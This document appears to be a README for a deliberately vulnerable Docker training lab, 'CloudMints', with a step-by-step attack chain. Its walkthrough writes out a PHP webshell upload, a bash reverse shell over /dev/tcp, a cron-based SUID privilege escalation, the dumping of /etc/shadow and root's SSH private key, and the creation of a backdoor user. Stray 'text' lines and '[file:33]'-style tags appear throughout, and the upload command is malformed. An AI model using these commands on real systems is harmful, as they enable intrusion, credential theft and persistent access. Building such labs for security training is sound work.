<p align="center">
  <img src="https://img.shields.io/badge/CloudMints-Vulnerable%20Lab-red?style=for-the-badge&logo=docker" alt="CloudMints"/>
  <img src="https://img.shields.io/badge/Docker-Ready-brightgreen?style=for-the-badge&logo=docker"/>
  <img src="https://img.shields.io/badge/Web%20Exploitation-Critical-ff6b6b?style=for-the-badge"/>
</p>

# CloudMints Vulnerable Lab 🚀

> **Intermediate Docker-based Attack Chain Lab**  
> **Duration**: 2-4 hours | **Difficulty**: Intermediate | **Version**: 1.0 [file:33]

## 🎯 What You'll Learn
Complete attack chain: **Default Creds → File Upload RCE → Reverse Shell → Cron Priv Esc → Root Post-Exploitation**

**Live Targets After Deployment:**
| Endpoint | Credentials | Purpose |
|----------|-------------|---------|
| `http://cloudmints.in` | Public | Main vulnerable site |
| `http://admin.cloudmints.in` | `admin` / `CloudM1ntsAdmin2024!` | Admin panel (File Upload RCE) [file:33] |

## 🖥️ Requirements (5 min setup)
sudo apt update && sudo apt install docker.io curl wget nmap nc -y
sudo systemctl start docker

text

## 🚀 Deploy Lab (2 Minutes)
Download & run
curl -L -o setup.sh https://raw.githubusercontent.com/YOURUSERNAME/cloudmints-lab/main/setup-cloudmints-lab.sh
chmod +x setup.sh
sudo ./setup.sh

Verify (should show 200 OK)
curl -I http://cloudmints.in
docker ps | grep cloudmints

text

## 🔓 Attack Walkthrough

### Phase 1: Initial Access (2 min)
1. Admin login → File Upload → PHP Webshell
curl -F "file=@<(echo '<?php if(isset($_GET[\"cmd\"])) system($_GET[\"cmd\"]); ?>' > shell.php)"
http://admin.cloudmints.in/uploads/

2. Test RCE
curl "http://admin.cloudmints.in/uploads/shell.php?cmd=whoami"

Expected: www-data
text

### Phase 2: Reverse Shell (1 min)
**Terminal 1 (Attacker):** `nc -lvnp 9001`  
**Terminal 2 (Target):**
curl "http://admin.cloudmints.in/uploads/shell.php?cmd=bash -i >& /dev/tcp/$(curl -s ifconfig.me)/9001 0>&1"

text

### Phase 3: Privilege Escalation (5 min)
In your reverse shell:
find / -type f -perm -002 -user root 2>/dev/null # /opt/backup.sh
cat /etc/cron.d/cloudmints-backup # Runs every 2min as root!

Overwrite with SUID bash (world-writable!)
echo '#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash' > /opt/backup.sh

Wait 2min → Root!
/tmp/rootbash -p
whoami # root 🎉

text

### Phase 4: Post-Exploitation
Dump secrets
cat /etc/shadow
cat /root/.ssh/id_rsa

Backdoor user
useradd -m backdoor
echo 'backdoor:Pssw0rd123' | chpasswd

text

## 🛠️ Quick Troubleshooting
| Problem | Solution |
|---------|----------|
| **Containers fail** | `docker system prune -f && sudo ./setup.sh` |
| **Webshell 404** | `docker exec cloudmints-admin ls -la /var/www/html/uploads/` |
| **No reverse shell** | `ufw allow 9001` + check `curl ifconfig.me` |
| **Priv esc timeout** | `tail -f /var/log/cron` (wait full 2min) [file:33] |

## 🛡️ Defense Fixes
Production fixes:
chmod 750 /opt/backup.sh # Remove world-write
chown root:root /opt/backup.sh

+ File upload validation, WAF, etc.
text

## 📚 Included Resources
- [`Pentesting_Cheatsheet.pdf`](./docs/Pentesting_Cheatsheet.pdf) [file:35]
- [`Pentester_Roadmap.pdf`](./docs/Pentester_Roadmap.pdf) [file:34]
- [`Full Guide PDF`](./docs/cloudmints_complete_guide.pdf) [file:33]

## 🤝 Contributing
Fork → Create feature branch → Commit → PR

text
**Educational use only!** ⚠️

---

**Synnefo Solutions | Dec 2025**  
`docker run pentesting`
